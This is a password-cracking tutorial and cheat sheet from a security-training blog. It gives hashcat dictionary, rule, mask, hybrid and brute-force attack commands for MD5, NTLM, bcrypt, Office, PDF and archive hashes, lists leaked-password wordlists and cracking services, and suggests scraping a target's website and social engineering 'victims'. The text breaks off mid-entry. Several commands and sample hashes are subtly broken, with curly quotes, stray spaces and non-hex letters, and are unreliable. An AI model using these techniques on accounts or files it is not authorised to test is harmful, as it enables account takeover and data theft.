+<p><img decoding="async" class="size-medium wp-image-25519 alignleft" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmmgpu-300x225.png" alt="" width="300" height="225" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmmgpu-300x225.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmmgpu-768x576.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmmgpu.png 800w" sizes="(max-width: 300px) 100vw, 300px" /></p>
+<p><strong>25 GPU Hash Cracker</strong><br />
+• An eight character NTLM password<br />
+cracked in 5.5 hours. 14 character LM<br />
+hash cracked in six minutes.350 billion<br />
+hashes per second.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>To know about your System capability,use these command to get the result.</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat --benchmark --force
+hashcat -b -m 0 --force
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25530 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcat-benchmark-e1582021834282.png" alt="hashcat bench mark" width="671" height="610" /></p>
+<figure id="attachment_25529" aria-describedby="caption-attachment-25529" style="width: 672px" class="wp-caption alignleft"><img decoding="async" class="wp-image-25529 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/Screenshot-from-2020-02-18-15-35-11.png" alt="This is the speed of cracking MD5 Hash" width="672" height="442" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/Screenshot-from-2020-02-18-15-35-11.png 672w, https://www.armourinfosec.com/wp-content/uploads/2020/02/Screenshot-from-2020-02-18-15-35-11-300x197.png 300w" sizes="(max-width: 672px) 100vw, 672px" /><figcaption id="caption-attachment-25529" class="wp-caption-text"><span style="color: #333399;">Hashcat speed of cracking MD5 Hash</span></figcaption></figure>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>Based on these results you will be able to better assess your attack options by knowing your rigs capabilities against a specific hash. This will be a more accurate result of a hash’s cracking speed based on your rig.It will be useful to save these results for future reference.</p>
+<p id="f98d" class="ht hu dj ba hv b ed ik ef il hy im ia in ic io ie db" data-selectable-paragraph=""><strong class="hv if">5 &#8211; FORMULATE PLAN</strong><br />
+Based on known or unknown knowledge begin creating an attack plan.Included on the next page is a<br />
+“Basic Cracking” to get you started.</p>
+<p id="20b0" class="ht hu dj ba hv b ed ik ef il hy im ia in ic io ie db" data-selectable-paragraph=""><strong class="hv if">6 &#8211; ANALYZE PASSWORDS</strong><br />
+After successfully cracking a sufficient amount of hashes analyze the results for any clues or patterns.<br />
+This analysis may aid in your success on any remaining hashes.</p>
+<p id="2aca" class="ht hu dj ba hv b ed ik ef il hy im ia in ic io ie db" data-selectable-paragraph=""><strong class="hv if">7 &#8211; CUSTOM ATTACKS</strong><br />
+Based on your password analysis create custom attacks leveraging those known clues or patterns.<br />
+Examples would be custom mask attacks or rules to fit target users’ behavior or preferences.just by doing some social engineering and footprinting or depends on your knowldge.</p>
+<p id="b3c4" class="ht hu dj ba hv b ed ik ef il hy im ia in ic io ie db" data-selectable-paragraph=""><strong class="hv if">8 &#8211; ADVANCED ATTACKS</strong><br />
+Experiment with Princeprocessor, custom Markov-chains, maskprocessor, or custom dictionary attacks<br />
+to shake out those remaining stubborn hashes. This is where your expertise and creativity really come<br />
+into play.</p>
+<p id="644f" class="ht hu dj ba hv b ed ik ef il hy im ia in ic io ie db" data-selectable-paragraph=""><strong class="hv if">9 &#8211; REPEAT</strong><br />
+Go back to STEP 4 and continue the process over again, tweaking dictionaries, mask, parameters, and<br />
+methods.gather some more information about,You’re in the grind at this point and need to rely on skill and luck.</p>
+<h3 id="f8f2" class="gv gw dj ba az gx dl gy dn gz ha hb hc hd he hf hg"><strong>Basic-cracking</strong></h3>
+<p>This is only meant as a basic guide to processing hashes and each scenario will obviously be unique<br />
+based on external circumstances.For this attack plan we will assume we know the password hashes are<br />
+raw MD5 and assume we have already captured some plain text passwords of users.If we had no<br />
+knowledge of plain text passwords we would most likely skip to DICTIONARY/WORDLIST attacks.<br />
+Lastly,since MD5 is a “Fast” hash we can be more liberal with our attack plan.</p>
+<p><strong>1 &#8211; CUSTOM WORDLIST</strong><br />
+First compile your known plain text passwords into a custom wordlist file.Pass this to your tool of<br />
+choice as a straight dictionary attack.</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt
+hashcat -a 0 -m 0 -w 4 hash.txt pass.txt --force</pre>
+<p>This will work only for MD5 hash where:-</p>
+<p>-a 0 designates a dictionary attack<br />
+-m 0 designates the type of hash we are cracking (MD5)<br />
+-w 4 workload profile<br />
+-o cracked.txt is the output file for the cracked passwords.<br />
+hash.txt is our input file of hashes.<br />
+custom_list.txt is the wordlist file for this dictionary attack.</p>
+<p><img decoding="async" class="alignnone wp-image-25538 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcat-o-cracked-.txt.png" alt="Hashcat approach of cracking" width="675" height="651" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcat-o-cracked-.txt.png 675w, https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcat-o-cracked-.txt-300x289.png 300w" sizes="(max-width: 675px) 100vw, 675px" /></p>
+<p>After cracking the output file will show you the passwords of cracked hashes like down below&#8230;</p>
+<p><img decoding="async" class="alignleft wp-image-25537 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/cracked-hash.png" alt="" width="670" height="85" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/cracked-hash.png 670w, https://www.armourinfosec.com/wp-content/uploads/2020/02/cracked-hash-300x38.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong class="hv if">2 &#8211; CUSTOM WORDLIST + RULES</strong><br />
+Run your custom wordlist with permutation rules to crack slight variations.Rules will help you to get password sooner as you have the information about victim hash.follow this link to know more about rule based attack.after all this is rockyou.txt not custom wordlist you can use according to your victim.</p>
+<p><a href="https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/">https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/</a></p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 0 -m 0 target_hash/mayhem.hash  /usr/share/wordlists/rockyou.txt -r rules --debug-mode=1 --debug-file=matched.rule --force</pre>
+<p><img decoding="async" class="alignnone wp-image-25543 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack.png" alt="hashcat rule based attack" width="1344" height="702" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack.png 1344w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-300x157.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-1024x535.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-768x401.png 768w" sizes="(max-width: 1344px) 100vw, 1344px" /></p>
+<p><strong class="hv if">3 &#8211; DICTIONARY/WORDLIST</strong><br />
+Perform a broad dictionary attack, looking for common passwords and leaked passwords in well known<br />
+dictionaries/wordlists.I&#8217;m using best64.rule of hashcat and rockyou.txt to crack.</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 0 -m 0 target_hash/mayhem.hash /usr/share/wordlists/rockyou.txt -r best64.rule --debug-mode=1 --debug-file=matched.rule --force</pre>
+<p><img decoding="async" class="alignnone wp-image-25552 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/wordlistrule.png" alt="hashcat wordlist+rull" width="1366" height="672" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/wordlistrule.png 1366w, https://www.armourinfosec.com/wp-content/uploads/2020/02/wordlistrule-300x148.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/wordlistrule-1024x504.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/wordlistrule-768x378.png 768w" sizes="(max-width: 1366px) 100vw, 1366px" /></p>
+<p><strong class="hv if">4 &#8211; DICTIONARY/WORDLIST + RULES</strong><br />
+Add rule permutations to the broad dictionary attack, looking for subtle changes to common words/phrases and leaked passwords.</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 0 -m 0 -w 4 target_hash/mayhem.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --debug-mode=1 --debug-file=matched.rule --force
+</pre>
+<p><strong class="hv if"><img decoding="async" class="alignnone wp-image-25556 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/dictwordrule.png" alt="hashcat Dictonary+wordlist+rule" width="1356" height="684" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/dictwordrule.png 1356w, https://www.armourinfosec.com/wp-content/uploads/2020/02/dictwordrule-300x151.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/dictwordrule-1024x517.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/dictwordrule-768x387.png 768w" sizes="(max-width: 1356px) 100vw, 1356px" /></strong></p>
+<p>for the output open matched.rule to which rules are worked.</p>
+<p><strong class="hv if">5 &#8211; CUSTOM WORDLIST + RULES</strong><br />
+Add any newly discovered passwords to your custom wordlist and run an attack again with permutation<br />
+rules, looking any other variations,just by hitting the echo or awk to append the new rule.and then use the above command.<br />
+:: awk -F “:” ‘{print $2}’ hashcat.potfile &gt;&gt; custom_list.txt</p>
+<p><strong class="hv if">6 &#8211; MASK</strong><br />
+Now we will use mask attacks included with Hashcat to search the keyspace for common password<br />
+lengths and patterns, based on the RockYou dataset.there&#8217;s many pattern of passwords inside the rockyou-1-6-.hcmask like our rule based attack.go to the link to find all paths of hashcat <a href="https://centos.pkgs.org/6/forensics-i386/hashcat-3.00-1.el6.i686.rpm.html">https://centos.pkgs.org/6/forensics-i386/hashcat-3.00-1.el6.i686.rpm.html </a>Already stored masks of hashcat.(note: attack mode will be change -a 0 to -a 3)</p>
+<p><img decoding="async" class="alignnone wp-image-25559 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcatmasks.png" alt="hashcat masklists" width="635" height="120" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcatmasks.png 635w, https://www.armourinfosec.com/wp-content/uploads/2020/02/hashcatmasks-300x57.png 300w" sizes="(max-width: 635px) 100vw, 635px" /></p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 3 -m 0 -w 4 target_hash/mayhem.hash  /usr/share/hashcat/masks/rockyou-1-60.hcmask --force
+</pre>
+<p>&nbsp;</p>
+<p><img decoding="async" class="alignnone wp-image-25560 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/maskattacka3.png" alt="hashcat mask attack" width="1355" height="664" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/maskattacka3.png 1355w, https://www.armourinfosec.com/wp-content/uploads/2020/02/maskattacka3-300x147.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/maskattacka3-1024x502.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/maskattacka3-768x376.png 768w" sizes="(max-width: 1355px) 100vw, 1355px" /></p>
+<p><img decoding="async" class="alignnone wp-image-25561 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/opmaskattacka3.png" alt="hashcat output mask attack" width="619" height="677" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/opmaskattacka3.png 619w, https://www.armourinfosec.com/wp-content/uploads/2020/02/opmaskattacka3-274x300.png 274w" sizes="(max-width: 619px) 100vw, 619px" /></p>
+<p>The list of all recovered passwords of given hashes.</p>
+<p>&nbsp;</p>
+<p><strong class="hv if">7 &#8211; HYBRID DICTIONARY + MASK</strong><br />
+Using a dictionary of your choice, conduct hybrid attacks looking for larger variations of common words or known passwords by appending/prepending masks to those candidates.now i think you&#8217;re able to run the commands according to needs.can&#8217;t show you all the output screen shots.there&#8217;s lots more i have to cover in this blog so lets move on to the next..</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 7 -m 0 -w 4 hash.txt rockyou-1–60.hcmask dict.txt
+hashcat -a 6 -m 0 -w 4 hash.txt dict.txt rockyou-1-60.hcmask</pre>
+<p><strong>8 &#8211; CUSTOM WORDLIST + RULES</strong><br />
+Add any newly discovered passwords back to your custom wordlist and run an attack again with<br />
+permutation rules looking any other subtle variations.</p>
+<pre class="theme:dark-terminal lang:default decode:true ">awk -F “:” ‘{print $2}’ hashcat.potfile &gt;&gt; custom_list.txt
+hashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r dive.rule --loopback</pre>
+<p><strong>9 &#8211; COMBO</strong><br />
+Using a dictionary of your choice, perform a combo attack by individually combining the dictionary’s<br />
+password candidates together to form new candidates.just mean combinig to dictionary&#8217;s to crack the hash.</p>
+<pre class="theme:dark-terminal lang:default decode:true">hashcat -a 1 -m 0 -w 4 hash.txt dict.txt dict.txt</pre>
+<p><strong>10 &#8211; CUSTOM HYBRID ATTACK</strong><br />
+Add any newly discovered passwords back to your custom wordlist and perform a hybrid attack against<br />
+those new acquired passwords.</p>
+<pre class="theme:dark-terminal lang:default decode:true ">awk -F “:” ‘{print $2}’ hashcat.potfile &gt;&gt; custom_list.txt
+hashcat -a 6 -m 0 -w 4 hash. txt custom_list.txt rockyou-1-60.hcmask
+hashcat -a 7 -m 0 -w 4 hash. txt rockyou-1-60.hcmask custom_list.txt</pre>
+<p><strong>11 &#8211; CUSTOM MASK ATTACK</strong><br />
+By now the easier, weaker passwords may have fallen to cracking, but still some remain.Using PACK<br />
+create custom mask attacks based on your currently cracked passwords. Be sure to sort out</p>
+<pre class="theme:dark-terminal lang:default decode:true ">masks that match the previous rockyou-1-60.hcmask list.
+hashcat -a 3 -m 0 -w 4 hash.txt custom_masks.hcmask</pre>
+<p><strong>12 &#8211; BRUTE-FORCE</strong><br />
+When all else fails begin a standard brute-force attack, being selective as to how large a keyspace your<br />
+rig can adequately brute-force. Above 8 characters this is typically pointless due to hardware limitations<br />
+and password entropy/ complexity.This particular mask will attempt to bruteforce an 8 character password.</p>
+<p>Hashcat has the following charsets built-in:</p>
+<pre class="">?l = abcdefghijklmnopqrstuvwxyz (lowercase)
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ(uppercase)
+?d = 0123456789(digits)  
+?h = 0123456789abcdef(digit+lowercase)
+?H = 0123456789ABCDEF(d+u)
+?s = «space»!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~  (special char)
+?a = ?l?u?d?s (all alpha + lwrc + digit + special char)
+
+</pre>
+<pre class="theme:dark-terminal lang:default decode:true ">hashcat -a 3 -m 0 -w 4 target_hash/mayhem.hash -i ?a?a?a?a?a?a?a?a --force</pre>
+<p><img decoding="async" class="alignnone wp-image-25562 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/broutattack.png" alt="hashcat brout force attack" width="1354" height="677" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/broutattack.png 1354w, https://www.armourinfosec.com/wp-content/uploads/2020/02/broutattack-300x150.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/broutattack-1024x512.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/broutattack-768x384.png 768w" sizes="(max-width: 1354px) 100vw, 1354px" /></p>
+<p><img decoding="async" class="alignnone wp-image-25563 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/broutfoutput.png" alt="hashcat brout force output" width="707" height="677" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/broutfoutput.png 707w, https://www.armourinfosec.com/wp-content/uploads/2020/02/broutfoutput-300x287.png 300w" sizes="(max-width: 707px) 100vw, 707px" /></p>
+<h4><strong>ONLINE PASSWORD ANALYSIS RESOURCES</strong></h4>
+<p><strong>WEAKPASS</strong><br />
+Analyzes public password dumps and provides efficient dictionaries for download.<br />
+<a href="http://weakpass.com/">http://weakpass.com/</a><br />
+<strong>PASSWORD RESEARCH</strong><br />
+Important password security and authentication research papers in one place.<br />
+<a href="http://www.passwordresearch.com/">http://www.passwordresearch.com/</a><br />
+<strong>THE PASSWORD PROJECT</strong><br />
+Compiled analysis of larger password dumps using PIPAL and PASSPAL tools.<br />
+<a href="http://www.thepasswordproject.com/leaked_password_lists_and_dictionaries">http://www.thepasswordproject.com/leaked_password_lists_and_dictionaries</a></p>
+<h4><strong>DICTIONARY / WORDLIST</strong></h4>
+<p><strong>DOWNLOAD RESOURCES</strong></p>
+<p><strong>WEAKPASS</strong><br />
+<a href="http://weakpass.com/wordlist">http://weakpass.com/wordlist</a><br />
+<strong>CRACKSTATION DICTIONARY</strong><br />
+<a href="https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm">https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm</a><br />
+<strong>HAVE I BEEN PWNED</strong><br />
+*You’ll have to crack the SHA1’s<br />
+<a href="https://haveibeenpwned.com/passwords">https://haveibeenpwned.com/passwords</a><br />
+<strong>SKULL SECURITY WORDLISTS</strong><br />
+<a href="https://wiki.skullsecurity.org/index.php?title=Passwords">https://wiki.skullsecurity.org/index.php?title=Passwords</a><br />
+<strong>CAPSOP</strong><br />
+<a href="https://wordlists.capsop.com/">https://wordlists.capsop.com/</a><br />
+<strong>UNIX-NINJA DNA DICTIONARY</strong><br />
+*Dictionary link at bottom of article*<br />
+<a href="https://www.unix-ninja.com/p/Password_DNA">https://www.unix-ninja.com/p/Password_DNA</a><br />
+<strong>PROBABLE-WORDLIST</strong><br />
+<a href="https://github.com/berzerk0/Probable-Wordlists">https://github.com/berzerk0/Probable-Wordlists</a><br />
+<strong>EFF-WORDLIST</strong><br />
+Long-list (7,776 words) &amp; Short-list (1,296 words)<br />
+<a href="https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt">https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt</a><br />
+<a href="https://www.eff.org/files/2016/09/08/eff_short_wordlist_1.txt">https://www.eff.org/files/2016/09/08/eff_short_wordlist_1.txt</a><br />
+<strong>RAINBOW TABLES</strong><br />
+*Rainbow Tables are for the most part obsolete but provided here for reference*<br />
+<a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
+<h4><strong>TARGETED WORDLISTS</strong></h4>
+<p><strong>CeWL</strong><br />
+Custom wordlist generator scrapes &amp; compiles keywords from websites.<br />
+<a href="https://digi.ninja/projects/cewl.php">https://digi.ninja/projects/cewl.php</a><br />
+Example scan depth of 2 and minimum word length of 5 output to wordlist.txt</p>
+<pre class="theme:dark-terminal lang:default decode:true">cewl -d 2 -m 5 -w wordlist.txt http://&lt;target/ website&gt;</pre>
+<p><strong><img decoding="async" class="alignnone wp-image-25574 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/Cewlwgen.png" alt="Cewl password genrator" width="764" height="424" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/Cewlwgen.png 764w, https://www.armourinfosec.com/wp-content/uploads/2020/02/Cewlwgen-300x166.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/Cewlwgen-672x372.png 672w" sizes="(max-width: 764px) 100vw, 764px" /></strong></p>
+<p><strong>SMEEGESCRAPE</strong><br />
+Text file and website scraper which generates custom wordlists from content.<br />
+<a href="http://www.smeegesec.com/2014/01/smeegescrape-text-scraper-and-custom.html">http://www.smeegesec.com/2014/01/smeegescrape-text-scraper-and-custom.html</a><br />
+Compile unique keywords from text file and output into wordlist.</p>
+<pre class="theme:dark-terminal lang:default decode:true">SmeegeScrape.py -f file.txt -o wordlist.txt</pre>
+<p>Scrape keywords from target website and output into wordlist.</p>
+<pre class="theme:dark-terminal lang:default decode:true">SmeegeScrape.py -u http://&lt;target/ website&gt; -si -o wordlist.txt</pre>
+<p><strong>GENERATE PASSWORD HASHES</strong></p>
+<p><strong>HASHCAT</strong><br />
+<a href="https://github.com/hashcat/hashcat/tree/master/tools">https://github.com/hashcat/hashcat/tree/master/tools</a></p>
+<pre class="theme:dark-terminal lang:default decode:true ">test.pl passthrough &lt;#type&gt; &lt;#&gt; dict.txt</pre>
+<p><strong>MDXFIND</strong><br />
+https://hashes.org/mdxfind.php</p>
+<pre class="theme:dark-terminal lang:default decode:true ">echo | mdxfind -z -h ‘&lt;#type&gt;’ dict.txt</pre>
+<p><strong>LYRICPASS (Song Lyrics Password Generator)</strong></p>
+<pre class="theme:dark-terminal lang:default decode:true "> python3 lyricpass.py -a "eminem"
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25576 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/Eminemdict.png" alt="lyrics password cracking" width="507" height="69" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/Eminemdict.png 507w, https://www.armourinfosec.com/wp-content/uploads/2020/02/Eminemdict-300x41.png 300w" sizes="(max-width: 507px) 100vw, 507px" /></p>
+<h4><strong>ONLINE HASH CRACKING SERVICES</strong></h4>
+<p><strong>GPUHASH</strong><br />
+<a href="https://gpuhash.me/">https://gpuhash.me/</a><br />
+<strong>CRACKSTATION</strong><br />
+<a href="https://crackstation.net/">https://crackstation.net/</a><br />
+<strong>ONLINE HASH CRACK</strong><br />
+<a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com/</a><br />
+<strong>HASH HUNTERS</strong><br />
+<a href="http://www.hashhunters.net/">http://www.hashhunters.net/</a></p>
+<p><span style="color: #993300;"><strong>COMMON HASH EXAMPLES</strong></span></p>
+<pre class="lang:default decode:true ">MD5, NTLM, NTLMv2, LM, MD5crypt, SHA1, SHA256, bcrypt, PDF 1.4 - 1.6 (Acrobat 5-8),
+Microsoft OFFICE 2013, RAR3-HP, Winzip, 7zip, Bitcoin/Litecoin, MAC OSX v10.5-v10.6,
+MySQL 4.1-5+, Postgres, MSSQL(2012)-MSSQL(2014), Oracle 11g, Cisco TYPE 4 5 8 9, WPA
+PSK / WPA2 PSK</pre>
+<p><strong>MDS (</strong>HASHCAT)</p>
+<p>HASH FORMAT<br />
+8743b52063cd84097a65dl633f5c74f5</p>
+<p><strong>BRUTE FORCE ATTACK</strong></p>
+<pre class="theme:dark-terminal lang:default decode:true ">hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a</pre>
+<p><strong>WORDLIST ATTACK</strong></p>
+<pre class="theme:dark-terminal lang:default decode:true ">hashcat -m 0 -a 0 hash.txt dict.txt</pre>
+<p><strong>WORDLIST + RULE ATTACK</strong></p>
+<pre class="theme:dark-terminal lang:default decode:true ">hashcat -m 0 -a 0 hash.txt dict.txt -r rule.txt</pre>
+<p><strong>NTLM (PWDUMP)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+b4b9b02e6f09a9bd760f388b67351e2b<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 1000 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 1000 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>LM</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$LM$a9c604d244c4e99d<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 3000 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 3000 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 3000 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>MD5CRYPT</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$1$28772684$iEwNOgGugq09.bIz5sk8k/<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 500 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 500 -a 0 hash.txt dict.txtWORDLIST + RULE ATTACK<br />
+hashcat -m 500 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>SHA1</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+b89eaac7e61417341b710b727768294d0e6a277b<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 100 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 100 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 100 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>SHA256</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+127e6fbfe24a750e72930c220a8el38275656b8e5d8f48a98c3c92df2caba935<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 1400 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 1400 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 1400 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>BCRYPT</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$2a$05$LhayLxezLhKlLhWvKxCyLOj0jlu.Kj0jZ0pEmml34uzrQlFvQDLF6</p>
+<p><strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 3200 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 3200 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 3200 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>PDF 1.4 &#8211; 1.6 (ACROBAT 5-8)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$pdf$2*3*128*-1028*l*16*da42eel5d4b3e08fe5b9ecea0e02ad0f*32*c9b59d72c7c670c42eeb<br />
+4fcald2cal5000000000000000000000000000000000*32*c4ff3e868dc87604626c2b8c259297al<br />
+4d58c6309c70b00afdfblfbbal0ee571<br />
+<strong>EXTRACT HASH</strong><br />
+pdf2hashcat.py example.pdf &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 10500 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 10500 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 10500 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>MICROSOFT OFFICE 2013</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+example.docx:$office$*2013*100000*256*16*7dd611d7eb4c899f74816dldec817b3b*948dc0<br />
+b2c2c6c32fl4b5995a543ad037*0b7ee0e48e935f937192a59de48a7d561ef2691d5c8a3ba87ec2d<br />
+04402a94895<br />
+<strong>EXTRACT HASH</strong><br />
+office2hashcat.py example.docx &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 9600 -a 3 &#8211;username hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 9600 -a 0 &#8211;username hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 9600 -a 0 &#8211;username hash.txt dict.txt -r rule.txt</p>
+<p><strong>RAR3-HP (ENCRYPTED HEADER)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317<br />
+#!Ensure to remove extraneous rar2john output to match above hash!#<br />
+<strong>EXTRACT HASH</strong><br />
+rar2john.py example.rar &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 12500 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 12500 -a 0 hash.txt dict.txtWORDLIST + RULE ATTACK<br />
+hashcat -m 12500 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>WINZIP</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$zip2$*0*3*0*b5d2b7bf57ad5e86a55c400509c672bd*d218*0**ca3d736d03a34165cfa9*$/ zip2$<br />
+#!Ensure to remove extraneous zip2john output to match above hash!#<br />
+<strong>EXTRACT HASH</strong><br />
+zip2john.py example.zip &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 13600 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 13600 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 13600 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>7-ZIP</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$7z$0$19$0$salt$8$f6196259a7326e3f0000000000000000$185065650$112$98$f3bc2a88062c<br />
+419a25acd40c0c2d75421cf23263f69c51bl3f9blaada41a8a09f9adeae45d67c60b56aad338f20c<br />
+0dcc5eb811c7a61128ee0746f922cdb9c59096869f341c7a9cblac7bb7d771f546b82cf4e6flla5e<br />
+Cd4b61751e4d8de66dd6e2dfb5b7dl022d2211e2d66eal703f96<br />
+#!Ensure to remove extraneous 7zip2john output to match above hash!#<br />
+<strong>EXTRACT HASH</strong><br />
+7z2john.py example.7z &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
